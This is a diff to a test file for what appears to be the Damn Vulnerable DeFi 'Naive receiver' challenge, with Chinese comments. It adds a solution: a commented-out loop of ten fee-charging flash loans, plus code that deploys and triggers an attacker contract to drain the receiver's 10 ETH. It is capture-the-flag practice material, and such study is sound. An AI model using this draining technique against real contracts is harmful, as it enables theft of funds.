@@ -10,6 +10,7 @@ describe('[Challenge] Naive receiver', function () {
     // Receiver has 10 ETH in balance
     const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');
 
+    // 之前准备
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, user, attacker] = await ethers.getSigners();
@@ -24,17 +25,30 @@ describe('[Challenge] Naive receiver', function () {
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
+       // sendTransaction 发送交易
+       // 测试阶段 先给 发送 10eth
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
         
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
+     // 开始
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
-         //
+         /*
+          for (let i=0;i<10;i++){
+              await this.pool.flashLoan(this.receiver.address,ethers.utils.parseEther('1'))
+          }
+         */
+
+          const NativeReceiverAttacker =await ethers.getContractFactory('NativeReceiverAttacker',attacker);
+          this.attackerContract = await NativeReceiverAttacker.deploy(this.pool.address,this.receiver.address);
+          await this.attackerContract.connect(attacker).attack();
+         
 
     });
-
+    
+    //之后
     after(async function () {
         /** SUCCESS CONDITIONS */
 
